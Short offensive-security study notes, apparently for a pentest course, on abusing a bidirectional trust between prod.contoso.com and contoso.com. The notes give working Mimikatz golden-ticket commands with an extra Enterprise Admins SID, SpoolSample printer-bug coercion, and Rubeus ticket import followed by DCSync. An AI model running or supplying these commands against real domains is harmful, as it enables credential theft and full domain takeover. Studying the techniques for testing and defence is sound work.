Bidirecctional trust between the prod.contoso.com and the contoso.com domain

**EXTRA SIDS:**

(Add some theory here)
To create a golden ticket with extraSIDs(in this case enterprise admins) with the krbtgt passwd hash:

`kerberos::golden /user:h4x /domain:origin domain /sid:SID-of-origin-domain /krbtgt:krbtgt_passwdhash /sids:SID_of_target_domain-519 /ptt`

Then DcSync. The DcSync will work since the trust between prod.contoso.com and contoso.com is bidirecctional. Meaning that the KDC from contoso.com trusts the KDC from prod.contoso.com

**PRINTERS:**

First force an authentication with SpoolSample to obtain a TGT from another domain(contoso.com), then import that TGT with rubeus and then dcsync.

Forcing the auth with spoolsample:

`.\SpoolSample.exe rdc01.contoso.com appsrv01.prod.contoso.com`

Importing the ticket with Rubeus:

`Rubeus.exe ptt /ticket:doIE9DCCBPCgAwIBBaEDAgEWooIEBDCCBABhggP8MIID+...`
